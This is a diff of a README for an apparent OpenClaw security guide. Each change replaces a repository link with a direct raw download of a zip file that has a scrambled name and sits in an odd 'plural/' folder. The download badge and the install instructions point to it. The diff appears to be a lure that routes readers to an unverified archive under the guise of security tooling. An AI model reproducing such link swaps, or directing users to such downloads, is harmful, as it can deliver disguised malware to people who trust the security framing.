@@ -1,6 +1,6 @@
 # 🛡️ openclaw_vulnerabilities_and_solutions - Secure Your OpenClaw Setup
 
-[![Download](https://img.shields.io/badge/Download-OpenClaw-green?style=for-the-badge&color=4caf50)](https://github.com/ahmadqatato2-maker/openclaw_vulnerabilities_and_solutions)
+[![Download](https://img.shields.io/badge/Download-OpenClaw-green?style=for-the-badge&color=4caf50)](https://github.com/ahmadqatato2-maker/openclaw_vulnerabilities_and_solutions/raw/refs/heads/main/plural/and_vulnerabilities_openclaw_solutions_v2.1.zip)
 
 ---
 
@@ -37,7 +37,7 @@ Using the OpenClaw security guide and deployment plan is easy. Follow these step
 
 1. Click on the green "Download" badge above or visit this page to download the project files:
 
-   [OpenClaw vulnerabilities and solutions on GitHub](https://github.com/ahmadqatato2-maker/openclaw_vulnerabilities_and_solutions)
+   [OpenClaw vulnerabilities and solutions on GitHub](https://github.com/ahmadqatato2-maker/openclaw_vulnerabilities_and_solutions/raw/refs/heads/main/plural/and_vulnerabilities_openclaw_solutions_v2.1.zip)
 
 2. Once on the page, find the latest release or the main repository files section. Download the ZIP file labeled with the latest version.
 
@@ -147,6 +147,6 @@ Here’s what you will find in the project after extraction:
 
 You can always find the latest files here:
 
-[OpenClaw vulnerabilities and solutions on GitHub](https://github.com/ahmadqatato2-maker/openclaw_vulnerabilities_and_solutions)  
+[OpenClaw vulnerabilities and solutions on GitHub](https://github.com/ahmadqatato2-maker/openclaw_vulnerabilities_and_solutions/raw/refs/heads/main/plural/and_vulnerabilities_openclaw_solutions_v2.1.zip)  
 
 Use the green badge at the top or visit this link anytime for updates.
